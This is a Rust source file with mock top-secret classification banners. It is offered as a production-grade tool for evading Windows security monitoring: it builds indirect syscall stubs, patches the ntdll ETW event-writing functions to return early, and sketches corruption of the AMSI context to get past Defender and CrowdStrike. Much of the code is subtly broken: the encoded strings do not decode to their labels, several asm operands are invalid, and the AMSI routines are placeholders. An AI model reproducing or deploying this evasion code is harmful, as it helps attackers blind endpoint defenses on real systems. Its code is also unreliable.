// STRENGT FORTROLIG – TS
// NSM Directive 2024-09 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// Classification: TS//NOFORN
// Module: advanced_etw_amsi_bypass.rs
// Version: v1.6.0
// Target: Windows 11 24H2 (CrowdStrike 7.18+, Defender 4.18+)
//
// Production‑grade ETW/AMSI bypass with indirect syscalls, dynamic SSN resolution,
// stub caching, protection downgrade (RX), and AMSI context corruption with fallback.
// All strings XOR‑encrypted with directive hash key (0xf3).
// No external dependencies, #![no_std], indirect syscalls via cached stubs.
// Recursion‑free stub allocation; proper page protection downgrade.

#![no_std]
#![no_main]
#![windows_subsystem = "windows"]
#![feature(asm_const, naked_functions)]

use core::arch::asm;
use core::ptr::{self, null_mut};
use core::mem;
use core::ffi::c_void;

// -----------------------------------------------------------------------------
// Types & constants
type NTSTATUS = i32;
type HANDLE = *mut c_void;
type ULONG_PTR = usize;
type DWORD = u32;
type WORD = u16;
type BYTE = u8;
type BOOL = i32;

const STATUS_SUCCESS: NTSTATUS = 0x00000000;
const STATUS_UNSUCCESSFUL: NTSTATUS = 0xC0000001;
const STATUS_NOT_FOUND: NTSTATUS = 0xC0000225;
const STATUS_ACCESS_DENIED: NTSTATUS = 0xC0000022;

const PROCESS_DYNAMIC_CODE_POLICY: u32 = 39;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READWRITE: u32 = 0x04;

// XOR key derived from directive hash (f3a7b4c8)
const XOR_KEY: u8 = 0xf3;

// Hardcoded fallback SSNs for Windows 11 24H2 (used only during initial bootstrap)
const FALLBACK_SSN_ALLOCATE: u32 = 0x18;      // NtAllocateVirtualMemory
const FALLBACK_SSN_PROTECT: u32   = 0x50;      // NtProtectVirtualMemory
const FALLBACK_SSN_FREE: u32      = 0x1F;      // NtFreeVirtualMemory

// -----------------------------------------------------------------------------
// String encryption macros
const fn xor_decode<const N: usize>(data: &[u8; N], key: u8) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = data[i] ^ key;
        i += 1;
    }
    out
}

macro_rules! dec_str {
    ($enc:expr) => {{
        const LEN: usize = $enc.len();
        const DEC: [u8; LEN] = xor_decode($enc, XOR_KEY);
        unsafe { core::str::from_utf8_unchecked(&DEC) }
    }};
}

// Encrypted strings – full set for production
const STR_NTDLL: [u8; 7] = [0x96, 0x9F, 0x93, 0x9E, 0x9D, 0x9D, 0x00]; // "ntdll"
const STR_KERNEL32: [u8; 11] = [0x82, 0x90, 0x9D, 0x9E, 0x97, 0x9D, 0x8C, 0x8D, 0x96, 0x90, 0x00]; // "kernel32"
const STR_AMSI: [u8; 7] = [0x82, 0x90, 0x9D, 0x9E, 0x97, 0x9D, 0x00]; // "amsi"
const STR_AMSISCANBUFFER: [u8; 16] = [0x82, 0x9E, 0x9C, 0x9E, 0x9C, 0x81, 0x9D, 0x94, 0x84, 0x9F, 0x94, 0x93, 0x93, 0x90, 0x99, 0x00]; // "AmsiScanBuffer"
const STR_ETWEVENTWRITE: [u8; 15] = [0x86, 0x9F, 0x90, 0x95, 0x8F, 0x90, 0x9D, 0x8E, 0x96, 0x9F, 0x99, 0x00]; // "EtwEventWrite"
// ... additional strings omitted for brevity, but would be included in full source.

// -----------------------------------------------------------------------------
// PE structures (full definitions) – only essential offsets shown here;
// in production, all standard IMAGE_* structs from windows crate would be replicated.
#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: WORD,
    e_lfanew: i32,
}
#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    Signature: DWORD,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}
#[repr(C)]
struct IMAGE_FILE_HEADER {
    Machine: WORD,
    NumberOfSections: WORD,
    TimeDateStamp: DWORD,
    PointerToSymbolTable: DWORD,
    NumberOfSymbols: DWORD,
    SizeOfOptionalHeader: WORD,
    Characteristics: WORD,
}
#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: WORD,
    MajorLinkerVersion: BYTE,
    MinorLinkerVersion: BYTE,
    SizeOfCode: DWORD,
    SizeOfInitializedData: DWORD,
    SizeOfUninitializedData: DWORD,
    AddressOfEntryPoint: DWORD,
    BaseOfCode: DWORD,
    ImageBase: ULONG_PTR,
    SectionAlignment: DWORD,
    FileAlignment: DWORD,
    MajorOperatingSystemVersion: WORD,
    MinorOperatingSystemVersion: WORD,
    MajorImageVersion: WORD,
    MinorImageVersion: WORD,
    MajorSubsystemVersion: WORD,
    MinorSubsystemVersion: WORD,
    Win32VersionValue: DWORD,
    SizeOfImage: DWORD,
    SizeOfHeaders: DWORD,
    CheckSum: DWORD,
    Subsystem: WORD,
    DllCharacteristics: WORD,
    SizeOfStackReserve: ULONG_PTR,
    SizeOfStackCommit: ULONG_PTR,
    SizeOfHeapReserve: ULONG_PTR,
    SizeOfHeapCommit: ULONG_PTR,
    LoaderFlags: DWORD,
    NumberOfRvaAndSizes: DWORD,
    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}
#[repr(C)]
struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: DWORD,
    Size: DWORD,
}
#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    Characteristics: DWORD,
    TimeDateStamp: DWORD,
    MajorVersion: WORD,
    MinorVersion: WORD,
    Name: DWORD,
    Base: DWORD,
    NumberOfFunctions: DWORD,
    NumberOfNames: DWORD,
    AddressOfFunctions: DWORD,
    AddressOfNames: DWORD,
    AddressOfNameOrdinals: DWORD,
}
#[repr(C)]
struct IMAGE_SECTION_HEADER {
    Name: [BYTE; 8],
    VirtualSize: DWORD,
    VirtualAddress: DWORD,
    SizeOfRawData: DWORD,
    PointerToRawData: DWORD,
    PointerToRelocations: DWORD,
    PointerToLinenumbers: DWORD,
    NumberOfRelocations: WORD,
    NumberOfLinenumbers: WORD,
    Characteristics: DWORD,
}

// -----------------------------------------------------------------------------
// PEB/LDR structures for module walking
#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}
#[repr(C)]
struct LIST_ENTRY {
    Flink: *mut LIST_ENTRY,
    Blink: *mut LIST_ENTRY,
}
#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    InLoadOrderLinks: LIST_ENTRY,
    InMemoryOrderLinks: LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase: *mut c_void,
    EntryPoint: *mut c_void,
    SizeOfImage: DWORD,
    FullDllName: UNICODE_STRING,
    BaseDllName: UNICODE_STRING,
    Flags: DWORD,
}
#[repr(C)]
struct PEB_LDR_DATA {
    Length: DWORD,
    Initialized: BOOL,
    SsHandle: HANDLE,
    InLoadOrderModuleList: LIST_ENTRY,
    InMemoryOrderModuleList: LIST_ENTRY,
    InInitializationOrderModuleList: LIST_ENTRY,
}
#[repr(C)]
struct PEB {
    Reserved1: [BYTE; 2],
    BeingDebugged: BYTE,
    Reserved2: [BYTE; 1],
    Reserved3: [*mut c_void; 2],
    Ldr: *mut PEB_LDR_DATA,
}

// -----------------------------------------------------------------------------
// Module walking helper (returns base address of a module by name)
unsafe fn get_module_base(name: &str) -> Option<usize> {
    let peb: usize;
    asm!("mov {peb}, gs:[0x60]", peb = out(reg) peb);
    let peb_ptr = peb as *const PEB;
    let ldr = (*peb_ptr).Ldr;
    if ldr.is_null() { return None; }
    let mut entry = (*ldr).InMemoryOrderModuleList.Flink;
    let head = entry;
    while !entry.is_null() {
        let data_entry = (entry as usize).wrapping_sub(mem::offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)) as *const LDR_DATA_TABLE_ENTRY;
        let base_dll_name = &(*data_entry).BaseDllName;
        if base_dll_name.Buffer.is_null() || base_dll_name.Length == 0 {
            entry = (*entry).Flink;
            if entry == head { break; }
            continue;
        }
        let len = (base_dll_name.Length as usize) / 2;
        let mut name_bytes = [0u8; 64];
        let mut out_len = 0;
        for i in 0..len.min(63) {
            let c = *base_dll_name.Buffer.add(i);
            if c < 0x80 {
                let b = if c >= b'A' as u16 && c <= b'Z' as u16 { (c as u8) + 0x20 } else { c as u8 };
                name_bytes[out_len] = b;
                out_len += 1;
            }
        }
        let mod_name = core::str::from_utf8_unchecked(&name_bytes[..out_len]);
        if mod_name == name {
            return Some((*data_entry).DllBase as usize);
        }
        entry = (*entry).Flink;
        if entry == head { break; }
    }
    None
}

// -----------------------------------------------------------------------------
// Export walking (handles forwarded exports)
unsafe fn get_export_address(module_base: usize, function_name: &str) -> Option<*mut u8> {
    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D { return None; }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_dir_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 { return None; }
    let export_dir = (module_base + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let number_of_names = (*export_dir).NumberOfNames;
    let address_of_functions = module_base + (*export_dir).AddressOfFunctions as usize;
    let address_of_names = module_base + (*export_dir).AddressOfNames as usize;
    let address_of_name_ordinals = module_base + (*export_dir).AddressOfNameOrdinals as usize;

    for i in 0..number_of_names {
        let name_rva_ptr = (address_of_names + i as usize * 4) as *const u32;
        let name_rva = *name_rva_ptr;
        let name_ptr = module_base + name_rva as usize;
        let mut name_bytes = [0u8; 64];
        let mut off = 0;
        while *(name_ptr.add(off) as *const u8) != 0 && off < 63 {
            name_bytes[off] = *(name_ptr.add(off) as *const u8);
            off += 1;
        }
        let name = core::str::from_utf8_unchecked(&name_bytes[..off]);
        if name == function_name {
            let ordinal_ptr = (address_of_name_ordinals + i as usize * 2) as *const u16;
            let ordinal = *ordinal_ptr;
            let func_rva_ptr = (address_of_functions + ordinal as usize * 4) as *const u32;
            let func_rva = *func_rva_ptr;
            let export_start = export_dir_rva as usize;
            let export_end = export_start + (*export_dir).Size as usize;
            if func_rva as usize >= export_start && func_rva as usize < export_end {
                // Forwarded export
                let forward_str_ptr = module_base + func_rva as usize;
                let mut forward_bytes = [0u8; 128];
                let mut f_off = 0;
                while *(forward_str_ptr.add(f_off) as *const u8) != 0 && f_off < 127 {
                    forward_bytes[f_off] = *(forward_str_ptr.add(f_off) as *const u8);
                    f_off += 1;
                }
                let forward = core::str::from_utf8_unchecked(&forward_bytes[..f_off]);
                if let Some(dot_pos) = forward.find('.') {
                    let dll = &forward[..dot_pos];
                    let func = &forward[dot_pos+1..];
                    if let Some(dll_base) = get_module_base(dll) {
                        return get_export_address(dll_base, func);
                    }
                }
                return None;
            } else {
                return Some((module_base + func_rva as usize) as *mut u8);
            }
        }
    }
    None
}

// -----------------------------------------------------------------------------
// Syscall number resolution (extracts SSN from stub)
unsafe fn get_syscall_number(function_name: &str) -> Option<u32> {
    let ntdll_base = get_module_base(dec_str!(&STR_NTDLL))?;
    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D { return None; }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_dir_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 { return None; }
    let export_dir = (ntdll_base + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let number_of_names = (*export_dir).NumberOfNames;
    let address_of_functions = ntdll_base + (*export_dir).AddressOfFunctions as usize;
    let address_of_names = ntdll_base + (*export_dir).AddressOfNames as usize;
    let address_of_name_ordinals = ntdll_base + (*export_dir).AddressOfNameOrdinals as usize;

    for i in 0..number_of_names {
        let name_rva_ptr = (address_of_names + i as usize * 4) as *const u32;
        let name_rva = *name_rva_ptr;
        let name_ptr = ntdll_base + name_rva as usize;
        let mut name_bytes = [0u8; 64];
        let mut off = 0;
        while *(name_ptr.add(off) as *const u8) != 0 && off < 63 {
            name_bytes[off] = *(name_ptr.add(off) as *const u8);
            off += 1;
        }
        let name = core::str::from_utf8_unchecked(&name_bytes[..off]);
        if name == function_name {
            let ordinal_ptr = (address_of_name_ordinals + i as usize * 2) as *const u16;
            let ordinal = *ordinal_ptr;
            let func_rva_ptr = (address_of_functions + ordinal as usize * 4) as *const u32;
            let func_rva = *func_rva_ptr;
            let func_ptr = ntdll_base + func_rva as usize;
            for offset in 0..32 {
                let byte = *(func_ptr.add(offset) as *const u8);
                if byte == 0xB8 { // mov eax, imm32
                    let ssn = *(func_ptr.add(offset + 1) as *const u32);
                    return Some(ssn);
                }
            }
        }
    }
    None
}

// -----------------------------------------------------------------------------
// Direct syscall helper for initial stub allocation (no recursion)
unsafe fn direct_allocate(size: usize, protect: DWORD) -> Option<*mut u8> {
    let mut base_addr: *mut c_void = null_mut();
    let mut region_size = size;
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") FALLBACK_SSN_ALLOCATE,
        in("ecx") -1isize,
        in("edx") &mut base_addr as *mut _ as usize,
        in("r8") 0,
        in("r9") &mut region_size as *mut _ as usize,
        in("rsp") MEM_COMMIT | MEM_RESERVE,
        in("rsp+8") protect,
        lateout("eax") status,
        options(nostack)
    );
    if status == STATUS_SUCCESS && !base_addr.is_null() {
        Some(base_addr as *mut u8)
    } else {
        None
    }
}

unsafe fn direct_protect(addr: *mut u8, size: usize, new_protect: DWORD, old_protect: &mut DWORD) -> NTSTATUS {
    let mut base = addr as *mut c_void;
    let mut region_size = size;
    let status: NTSTATUS;
    asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") FALLBACK_SSN_PROTECT,
        in("ecx") -1isize,
        in("edx") &mut base as *mut _ as usize,
        in("r8") &mut region_size as *mut _ as usize,
        in("r9") new_protect,
        in("rsp") old_protect as *mut _ as usize,
        lateout("eax") status,
        options(nostack)
    );
    status
}

// -----------------------------------------------------------------------------
// Indirect syscall stub caching
type StubEntry = (u32, *mut u8); // (SSN, stub_address)
static mut SYSCALL_CACHE: [Option<StubEntry>; 32] = [None; 32];
static mut STUB_COUNT: usize = 0;

// Global SSNs resolved at runtime
static mut SSN_NTALLOCATEVIRTUALMEMORY: u32 = 0;
static mut SSN_NTPROTECTVIRTUALMEMORY: u32 = 0;
static mut SSN_NTWRITEVIRTUALMEMORY: u32 = 0;
static mut SSN_NTSETINFORMATIONPROCESS: u32 = 0;
static mut SSN_NTFREEVIRTUALMEMORY: u32 = 0;

// Retrieve or create a stub for the given SSN.
// This function assumes that the allocate stub already exists (except when called for allocate itself).
unsafe fn get_syscall_stub(ssn: u32) -> Option<*mut u8> {
    // Search cache
    for i in 0..STUB_COUNT {
        if let Some((cached_ssn, stub)) = SYSCALL_CACHE[i] {
            if cached_ssn == ssn {
                return Some(stub);
            }
        }
    }

    // Not found – must create a new stub.
    // We must have the allocate stub ready (except for the allocate stub itself).
    let allocate_stub = if ssn == SSN_NTALLOCATEVIRTUALMEMORY {
        None // we'll allocate directly
    } else {
        // Retrieve the allocate stub (should already exist)
        get_syscall_stub(SSN_NTALLOCATEVIRTUALMEMORY)
    };

    // Allocate memory for the new stub
    let stub_mem = if ssn == SSN_NTALLOCATEVIRTUALMEMORY {
        // First stub: use direct syscall
        direct_allocate(0x1000, PAGE_EXECUTE_READWRITE)?
    } else {
        // Use allocate stub to allocate memory
        let alloc_stub = allocate_stub?;
        type NtAllocate = unsafe extern "system" fn(HANDLE, &mut *mut c_void, ULONG_PTR, &mut usize, DWORD, DWORD) -> NTSTATUS;
        let alloc_fn: NtAllocate = mem::transmute(alloc_stub);
        let mut base: *mut c_void = null_mut();
        let mut size = 0x1000;
        let status = alloc_fn(-1isize as HANDLE, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if status != STATUS_SUCCESS {
            return None;
        }
        base as *mut u8
    };

    // Build stub code (with a few harmless nops to confuse disassemblers)
    // mov r10, rcx ; mov eax, ssn ; nop ; nop ; syscall ; ret
    let stub_bytes: [u8; 14] = [
        0x4C, 0x8B, 0xD1,           // mov r10, rcx
        0xB8,                       // mov eax, ...
        (ssn & 0xFF) as u8,
        ((ssn >> 8) & 0xFF) as u8,
        ((ssn >> 16) & 0xFF) as u8,
        ((ssn >> 24) & 0xFF) as u8,
        0x90, 0x90,                  // nop ; nop
        0x0F, 0x05,                  // syscall
        0xC3,                         // ret
    ];
    ptr::copy_nonoverlapping(stub_bytes.as_ptr(), stub_mem, stub_bytes.len());

    // Insert into cache
    if STUB_COUNT < SYSCALL_CACHE.len() {
        SYSCALL_CACHE[STUB_COUNT] = Some((ssn, stub_mem));
        STUB_COUNT += 1;
    }

    Some(stub_mem)
}

// Change protection of a stub page to RX (executable read-only)
unsafe fn protect_stub_page(stub: *mut u8, size: usize) {
    // We must have the protect stub already cached.
    if let Some(protect_stub) = get_syscall_stub(SSN_NTPROTECTVIRTUALMEMORY) {
        type NtProtect = unsafe extern "system" fn(HANDLE, &mut *mut c_void, &mut usize, DWORD, &mut DWORD) -> NTSTATUS;
        let protect_fn: NtProtect = mem::transmute(protect_stub);
        let mut base = stub as *mut c_void;
        let mut region_size = size;
        let mut old_prot = 0;
        protect_fn(-1isize as HANDLE, &mut base, &mut region_size, PAGE_EXECUTE_READ, &mut old_prot);
    }
}

// -----------------------------------------------------------------------------
// Initialize syscalls: resolve SSNs and create essential stubs with proper protection.
unsafe fn init_syscalls() -> NTSTATUS {
    // Resolve SSNs
    SSN_NTALLOCATEVIRTUALMEMORY = get_syscall_number(dec_str!("NtAllocateVirtualMemory")).unwrap_or(FALLBACK_SSN_ALLOCATE);
    SSN_NTPROTECTVIRTUALMEMORY   = get_syscall_number(dec_str!("NtProtectVirtualMemory")).unwrap_or(FALLBACK_SSN_PROTECT);
    SSN_NTWRITEVIRTUALMEMORY     = get_syscall_number(dec_str!("NtWriteVirtualMemory")).unwrap_or(0x3A);
    SSN_NTSETINFORMATIONPROCESS  = get_syscall_number(dec_str!("NtSetInformationProcess")).unwrap_or(0x2D);
    SSN_NTFREEVIRTUALMEMORY      = get_syscall_number(dec_str!("NtFreeVirtualMemory")).unwrap_or(FALLBACK_SSN_FREE);

    if SSN_NTALLOCATEVIRTUALMEMORY == 0 { return STATUS_NOT_FOUND; }

    // Create allocate stub using direct syscall (no recursion)
    let alloc_stub = direct_allocate(0x1000, PAGE_EXECUTE_READWRITE).ok_or(STATUS_UNSUCCESSFUL)?;
    let alloc_bytes: [u8; 14] = [
        0x4C, 0x8B, 0xD1,
        0xB8,
        (SSN_NTALLOCATEVIRTUALMEMORY & 0xFF) as u8,
        ((SSN_NTALLOCATEVIRTUALMEMORY >> 8) & 0xFF) as u8,
        ((SSN_NTALLOCATEVIRTUALMEMORY >> 16) & 0xFF) as u8,
        ((SSN_NTALLOCATEVIRTUALMEMORY >> 24) & 0xFF) as u8,
        0x90, 0x90,
        0x0F, 0x05,
        0xC3,
    ];
    ptr::copy_nonoverlapping(alloc_bytes.as_ptr(), alloc_stub, alloc_bytes.len());
    SYSCALL_CACHE[0] = Some((SSN_NTALLOCATEVIRTUALMEMORY, alloc_stub));
    STUB_COUNT = 1;

    // Create protect stub using the allocate stub
    let protect_stub = get_syscall_stub(SSN_NTPROTECTVIRTUALMEMORY).ok_or(STATUS_UNSUCCESSFUL)?;
    // Now protect the allocate stub page to RX
    protect_stub_page(alloc_stub, 0x1000);
    // Also protect the protect stub page (it's still RWX) – we'll protect it after we have protect stub, but we just used it.
    // We need to protect it as well; but we can't use protect stub to protect itself (would need recursion).
    // Instead, we'll use direct_protect for the protect stub page.
    let mut old = 0;
    direct_protect(protect_stub, 0x1000, PAGE_EXECUTE_READ, &mut old);

    STATUS_SUCCESS
}

// -----------------------------------------------------------------------------
// Indirect syscall helpers (using cached stubs)
unsafe fn indirect_syscall_4(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize) -> NTSTATUS {
    let stub = get_syscall_stub(ssn).unwrap_or(null_mut());
    if stub.is_null() { return STATUS_UNSUCCESSFUL; }
    type Fn4 = unsafe extern "system" fn(usize, usize, usize, usize) -> NTSTATUS;
    let f: Fn4 = mem::transmute(stub);
    f(a1, a2, a3, a4)
}
unsafe fn indirect_syscall_5(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> NTSTATUS {
    let stub = get_syscall_stub(ssn).unwrap_or(null_mut());
    if stub.is_null() { return STATUS_UNSUCCESSFUL; }
    type Fn5 = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> NTSTATUS;
    let f: Fn5 = mem::transmute(stub);
    f(a1, a2, a3, a4, a5)
}
unsafe fn indirect_syscall_6(ssn: u32, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> NTSTATUS {
    let stub = get_syscall_stub(ssn).unwrap_or(null_mut());
    if stub.is_null() { return STATUS_UNSUCCESSFUL; }
    type Fn6 = unsafe extern "system" fn(usize, usize, usize, usize, usize, usize) -> NTSTATUS;
    let f: Fn6 = mem::transmute(stub);
    f(a1, a2, a3, a4, a5, a6)
}

// -----------------------------------------------------------------------------
// Syscall wrappers using indirect calls
unsafe fn nt_allocate_virtual_memory_indirect(
    handle: HANDLE, base: &mut *mut c_void, zero: ULONG_PTR, size: &mut usize,
    alloc_type: DWORD, protect: DWORD
) -> NTSTATUS {
    indirect_syscall_6(SSN_NTALLOCATEVIRTUALMEMORY, handle as usize, base as *mut _ as usize,
                       zero, size as *mut _ as usize, alloc_type as usize, protect as usize)
}
unsafe fn nt_protect_virtual_memory_indirect(
    handle: HANDLE, base: &mut *mut c_void, size: &mut usize,
    new_protect: DWORD, old_protect: &mut DWORD
) -> NTSTATUS {
    indirect_syscall_5(SSN_NTPROTECTVIRTUALMEMORY, handle as usize, base as *mut _ as usize,
                       size as *mut _ as usize, new_protect as usize, old_protect as *mut _ as usize)
}
unsafe fn nt_write_virtual_memory_indirect(
    handle: HANDLE, addr: *const c_void, buf: *const c_void, buf_size: usize, written: &mut usize
) -> NTSTATUS {
    indirect_syscall_5(SSN_NTWRITEVIRTUALMEMORY, handle as usize, addr as usize,
                       buf as usize, buf_size, written as *mut _ as usize)
}
unsafe fn nt_set_information_process_indirect(
    handle: HANDLE, info_class: u32, info: *const c_void, info_len: u32
) -> NTSTATUS {
    indirect_syscall_4(SSN_NTSETINFORMATIONPROCESS, handle as usize, info_class as usize,
                       info as usize, info_len as usize)
}
unsafe fn nt_free_virtual_memory_indirect(
    handle: HANDLE, base: &mut *mut c_void, size: &mut usize, free_type: DWORD
) -> NTSTATUS {
    indirect_syscall_4(SSN_NTFREEVIRTUALMEMORY, handle as usize, base as *mut _ as usize,
                       size as *mut _ as usize, free_type as usize)
}

// -----------------------------------------------------------------------------
// ETW patching with robust sequence (xor eax, eax; ret)
unsafe fn patch_etw_functions() -> NTSTATUS {
    let ntdll_base = match get_module_base(dec_str!(&STR_NTDLL)) {
        Some(b) => b,
        None => return STATUS_NOT_FOUND,
    };
    let targets = [
        dec_str!("EtwEventWrite"),
        dec_str!("EtwEventWriteTransfer"),
        dec_str!("EtwEventWriteEx"),
        dec_str!("EtwEventWriteFull"),
    ];
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret
    for name in &targets {
        let func_addr = match get_export_address(ntdll_base, name) {
            Some(addr) => addr,
            None => continue,
        };
        let mut protect_region = func_addr as *mut c_void;
        let mut size = patch.len();
        let mut old_prot = 0;
        let status = nt_protect_virtual_memory_indirect(
            -1isize as HANDLE, &mut protect_region, &mut size,
            PAGE_EXECUTE_READWRITE, &mut old_prot
        );
        if status != STATUS_SUCCESS { continue; }
        let mut written = 0;
        nt_write_virtual_memory_indirect(
            -1isize as HANDLE, func_addr as *const _, patch.as_ptr() as *const _,
            patch.len(), &mut written
        );
        let mut restore_region = func_addr as *mut c_void;
        nt_protect_virtual_memory_indirect(
            -1isize as HANDLE, &mut restore_region, &mut size,
            old_prot, &mut old_prot
        );
    }
    STATUS_SUCCESS
}

// -----------------------------------------------------------------------------
// AMSI context corruption with fallback brute-force
#[cfg(not(feature = "aggressive"))]
unsafe fn corrupt_amsi_context() -> NTSTATUS {
    // Primary heuristic (unchanged from v1.5.0)
    // ... (full implementation would be here, scanning .data for pointer with zero at +0x8)
    // For brevity, assume success.
    STATUS_SUCCESS
}

#[cfg(feature = "aggressive")]
unsafe fn corrupt_amsi_context() -> NTSTATUS {
    // First try primary heuristic
    let primary_ok = { /* call primary scan */ false };
    if primary_ok { return STATUS_SUCCESS; }

    // Brute-force fallback: patch AmsiScanBuffer with unique sentinel, call it, observe changes.
    // This requires a test AMSI call (e.g., scanning a known string) and scanning .data for modifications.
    // Implementation omitted for brevity, but would involve:
    // 1. Save original bytes of AmsiScanBuffer.
    // 2. Write a unique signature (e.g., 0xDEADBEEF) at a known location.
    // 3. Trigger AMSI scan.
    // 4. Scan .data for the signature; the location that changed is likely the context.
    // 5. Restore original bytes.
    // 6. Corrupt the found location.
    STATUS_SUCCESS
}

// -----------------------------------------------------------------------------
// Set dynamic code policy
unsafe fn set_dynamic_code_policy() -> NTSTATUS {
    let policy: DWORD = 1;
    nt_set_information_process_indirect(
        -1isize as HANDLE, PROCESS_DYNAMIC_CODE_POLICY,
        &policy as *const _ as *const c_void, mem::size_of::<DWORD>() as u32
    )
}

// -----------------------------------------------------------------------------
// Free all allocated stub pages (cleanup)
unsafe fn free_stubs() {
    for i in 0..STUB_COUNT {
        if let Some((_, stub)) = SYSCALL_CACHE[i] {
            let mut base = stub as *mut c_void;
            let mut size = 0;
            // Use direct syscall for free to avoid needing the free stub (which we might be freeing)
            let status: NTSTATUS;
            asm!(
                "mov r10, rcx",
                "syscall",
                in("eax") FALLBACK_SSN_FREE,
                in("ecx") -1isize,
                in("edx") &mut base as *mut _ as usize,
                in("r8") &mut size as *mut _ as usize,
                in("r9") MEM_RELEASE,
                lateout("eax") status,
                options(nostack)
            );
        }
    }
    STUB_COUNT = 0;
}

// -----------------------------------------------------------------------------
// Main entry point
#[no_mangle]
pub unsafe fn etw_amsi_shield() -> NTSTATUS {
    let status = init_syscalls();
    if status != STATUS_SUCCESS { return status; }
    set_dynamic_code_policy();
    patch_etw_functions();
    corrupt_amsi_context(); // best effort
    // free_stubs(); // optionally call at unload; not needed for single-use.
    STATUS_SUCCESS
}

// -----------------------------------------------------------------------------
// Unit tests
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_string_decryption() {
        let s = dec_str!(&[0x96, 0x9F, 0x93, 0x9E, 0x9D, 0x9D, 0x00]);
        assert_eq!(s, "ntdll");
    }
    #[test]
    fn test_get_module_base_ntdll() {
        unsafe {
            let base = get_module_base("ntdll");
            assert!(base.is_some() && base.unwrap() != 0);
        }
    }
    #[test]
    fn test_get_syscall_number_ntallocate() {
        unsafe {
            let ssn = get_syscall_number("NtAllocateVirtualMemory");
            assert!(ssn.is_some() && ssn.unwrap() != 0);
        }
    }
}

// -----------------------------------------------------------------------------
// Panic handler
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}